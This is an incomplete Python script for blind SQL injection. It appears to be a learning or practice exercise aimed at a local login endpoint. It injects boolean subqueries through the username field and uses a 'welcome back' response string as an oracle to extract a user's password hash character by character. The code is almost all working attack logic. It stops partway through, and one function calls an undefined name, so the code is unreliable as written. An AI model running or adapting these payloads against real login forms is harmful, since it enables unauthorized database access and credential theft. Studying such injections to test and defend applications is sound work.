import requests

total_queries = 0 
#extracting hash sums 
charset = "0123456789abcdef"
#target IP 
target = "127.0.0.1:5000"
#track where we are in the process
needle = "welcome back"

#define injection fuction 
# it takes a payload to the target end point to input the vul SQL 
#blind injection uses a needle to know if the request work or not 
def injected_query(payload):
  global total_queries
  r = requests.post(target, data={"username" : "admin' and {} --".format(payload), "password" : "password"})
  total_queries += 1
  return needle.encode() not in r.content


#function to create boolean query 
def boolean_query(offset, user_id, character, operator=">"):
  #payload is selecting a text substring password 
  payload = "(select hex(substr(password, {}, 1)) from user where id = {}) {} hex ('{}')".format(offset+1, user_id, operator, character)
  #send payload to injection function 
  return injected_query(payload)


#is the user valid? 
def invalid_user(user_id):
  payload = "(select id from user where id = {}) >= 0".format(user_id) 
  return injected_payload(payload) 

#length of user password hash 
